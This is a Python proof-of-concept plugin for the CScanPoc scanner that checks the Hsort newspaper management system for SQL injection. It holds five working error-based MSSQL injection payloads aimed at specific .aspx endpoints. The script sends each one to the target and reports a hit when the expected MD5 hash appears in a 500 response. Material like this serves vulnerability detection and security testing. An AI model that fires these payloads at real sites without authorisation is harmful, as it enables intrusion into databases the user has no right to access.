# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Hsort_0009' # 平台漏洞编号，留空
    name = 'Hsort报刊管理系统getsql注入打包' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-07-29'  # 漏洞公布时间
    desc = '''
        Hsort报刊管理系统getsql注入打包
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0110055' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'Hsort'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'Hsort_0009'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            ps = [
                "/newsInfo.aspx?type=per&id=1&paperName=1&qnum=1&pagenum=(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
                "/category.aspx?category=%27%2b+(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
                "/transfor.aspx?paperName=%27%2b+(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
                "/pagePiclist.aspx?paperName=1&qnum=(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)&pagenum=1",
                "/getReault.aspx?paperName=1&bdate=01/01/2011&edate=01/01/2011&news=%27)%20and%201=(select+convert(int,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%27a%27)))+FROM+syscolumns)--",
                ]
            for p in ps:
                url=arg+p
                code, head, res, errcode, _ = hh.http(url)
                if code==500 and "cc175b9c0f1b6a831c399e269772661" in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()